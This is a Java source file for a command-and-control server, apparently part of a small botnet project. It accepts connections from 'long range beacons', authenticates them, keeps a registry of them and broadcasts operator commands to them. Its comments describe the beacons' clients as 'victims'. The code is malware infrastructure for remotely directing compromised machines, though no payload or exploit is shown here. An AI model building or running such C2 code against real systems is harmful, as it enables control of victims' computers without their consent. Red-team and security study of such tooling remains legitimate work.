package Servers.C2;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;

import Servers.Duplexer;

public class C2Server{
    // Dictionary of all of the longRangeBeacons currently reporting back to the C2
    // Formatted IP Address, Duplexer Pointer
    private HashMap<String,C2ServerBeaconHandler> longRangeBeacons;

    // Bionded Server Socket
    private ServerSocket serverSocket;

    // Pointer to the Handler for User Input
    private C2ServerUserHandler userHandler;

    /**
     * Initializes a Command and Control Server to handle connections from Long Range Beacons
     * Long Range Beacons handle all of the clients (victims)
     * @throws IOException
     */
    public C2Server() throws IOException{
        this.longRangeBeacons = new HashMap<>();
        this.serverSocket = new ServerSocket(1234);
        this.userHandler = new C2ServerUserHandler(this);
    }

    /**
     * Whenever a command is issued by the User, this function is used to
     * Then send the command to the long range beacons individually.
     * 
     * @param command Command issued to the long range beacons.
     */
    protected void broadcastToBeacons(String command){
        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
            beaconHandler.sendToBeacon(command);
        }
    }

    /**
     * Used by the Beacon Handler to send a message to the User Handler
     * 
     * @param message Message to be displayed in the User CLI
     */
    protected void outputToUserHandler(String message){
        userHandler.outputToCLI(message);
    }

    public void run() throws IOException{
        // Start Thread to handle commands from the user
        userHandler.run();
        // Always listen for new long range beacons
        while(true){
            try{
                // Accept a new connection
                Socket socket = serverSocket.accept();
                // Create a new Duplexer
                Duplexer duplexer = new Duplexer(socket);
                // Get the IP address of the Duplexer
                String IP = socket.getRemoteSocketAddress().toString();
                // Receive initial message for authentication from the new Beacon
                String hashedPassForAuth = duplexer.receive();
                // Pass this hash to the User Handler thread for MFA
                String authResponse = userHandler.authenticateToC2(hashedPassForAuth, IP);
                duplexer.send(authResponse);
                if(!(authResponse.equals("Authentication Successful"))){
                    duplexer.close();
                }else{
                    // Create a new thread to handle each Long Range Beacon
                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IP, this);

                    // Store IP and Duplexer pointer in the dicitonary
                    longRangeBeacons.put(IP, beaconHandler);

                    // Start the thread
                    beaconHandler.run();
                }
                
                
                
            } catch(IOException e){
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) throws IOException{
        C2Server server = new C2Server();
        server.run();
    }
}

